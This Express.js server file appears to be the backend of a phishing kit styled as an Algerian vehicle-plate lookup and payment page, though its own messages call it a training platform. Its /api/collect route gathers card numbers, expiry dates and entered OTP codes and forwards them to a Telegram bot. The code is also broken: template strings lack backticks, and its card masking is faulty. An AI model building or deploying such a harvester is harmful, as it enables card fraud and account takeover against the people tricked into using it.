import express from 'express';
import axios from 'axios';
import cors from 'cors';

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// قاعدة بيانات وهمية للسيارات
const fakeCars = {
  "1234 ع 99": { marque: "Renault", modele: "Symbol", annee: "2020" },
  "5678 و 22": { marque: "Hyundai", modele: "i10", annee: "2022" },
  "9101 ب 33": { marque: "Dacia", modele: "Sandero", annee: "2019" },
  "1112 ج 44": { marque: "Peugeot", modele: "208", annee: "2021" }
};

// استقبال البيانات وإرسالها للبوت
app.post('/api/collect', async (req, res) => {
  try {
    const { step, data } = req.body;
    
    let message = 📊 منصة تدريبية\n;
    
    if (step === 'search_car') {
      message += 🔍 بحث عن سيارة: ${data.plaque}\n✅ النتيجة: ${data.marque} ${data.modele} (${data.annee});
    }
    else if (step === 'payment') {
      message += 💳 محاولة دفع تدريبية\n;
      message += 💳 رقم البطاقة: ${data.cardNumber.substring(0, 4)}****${data.cardNumber.substring(-4)}\n;
      message += 📅 تاريخ: ${data.expiry}\n;
      message += 🔐 CVV: ***\n;
      message += 💰 المبلغ: 2000 دج (وهمي);
    }
    else if (step === 'otp') {
      message += 🔐 إدخال رمز OTP\n;
      message += 📱 الرقم المدخل: ${data.code}\n;
      message += ✅ تم التحقق بنجاح (تدريبي);
    }
    
    message += \n🕒 ${new Date().toLocaleString('ar-DZ')};
    
    await axios.post(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
      chat_id: CHAT_ID,
      text: message
    });
    
    res.json({ success: true });
  } catch (error) {
    console.error('خطأ:', error.message);
    res.status(500).json({ success: false });
  }
});

// البحث عن السيارة
app.post('/api/search-car', (req, res) => {
  const plaque = req.body.plaque;
  const car = fakeCars[plaque];
  
  if (car) {
    res.json({ found: true, ...car, plaque });
  } else {
    res.json({ found: false });
  }
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log(✅ الخادم يعمل على المنفذ ${port}));
